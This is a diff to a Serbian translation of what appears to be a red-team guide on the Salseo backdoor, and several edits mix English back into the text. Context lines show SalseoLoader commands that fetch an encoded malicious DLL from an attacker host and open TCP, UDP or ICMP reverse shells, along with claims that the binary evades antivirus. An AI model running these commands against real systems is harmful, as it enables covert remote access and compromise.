@@ -45,15 +45,15 @@ python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
 ```
-Ok, sada imate sve što vam je potrebno da izvršite sve Salseo stvari: **encoded EvilDalsa.dll** i **binary of SalseoLoader.**
+U redu, sada imate sve što vam je potrebno da izvršite sve Salseo stvari: **encoded EvilDalsa.dll** i **binary of SalseoLoader.**
 
-**Otpremite SalseoLoader.exe binarni fajl na mašinu. Ne bi trebalo da budu otkriveni od strane bilo kog AV...**
+**Upload the SalseoLoader.exe binary to the machine. They shouldn't be detected by any AV...**
 
-## **Izvršite backdoor**
+## **Execute the backdoor**
 
-### **Dobijanje TCP reverse shell-a (preuzimanje kodiranog dll-a putem HTTP-a)**
+### **Getting a TCP reverse shell (downloading encoded dll through HTTP)**
 
-Zapamtite da pokrenete nc kao slušalac reverse shell-a i HTTP server da poslužite kodirani evilsalsa.
+Zapamtite da pokrenete nc kao slušača za reverznu ljusku i HTTP server da poslužite encoded evilsalsa.
 ```
 SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
 ```
@@ -63,9 +63,9 @@ Zapamtite da pokrenete nc kao slušača reverzibilne ljuske, i SMB server da pos
 ```
 SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
 ```
-### **Dobijanje ICMP obrnute ljuske (kodirana dll već unutar žrtve)**
+### **Dobijanje ICMP reverzibilne ljuske (kodirana dll već unutar žrtve)**
 
-**Ovoga puta vam je potreban poseban alat na klijentu da primite obrnutu ljusku. Preuzmite:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
+**Ovoga puta vam je potreban poseban alat na klijentu da primite reverzibilnu ljusku. Preuzmite:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)
 
 #### **Onemogućite ICMP odgovore:**
 ```
@@ -114,7 +114,7 @@ Jednostavno **izađite** iz Visual Studio
 
 Zatim, idite u vaš **SalseoLoader folder** i **izvršite DllExport\_Configure.bat**
 
-Izaberite **x64** (ako planirate da ga koristite unutar x64 okvira, to je bio moj slučaj), izaberite **System.Runtime.InteropServices** (unutar **Namespace for DllExport**) i pritisnite **Primeni**
+Izaberite **x64** (ako planirate da ga koristite unutar x64 okruženja, to je bio moj slučaj), izaberite **System.Runtime.InteropServices** (unutar **Namespace for DllExport**) i pritisnite **Primeni**
 
 ![](<../.gitbook/assets/image (882).png>)
 
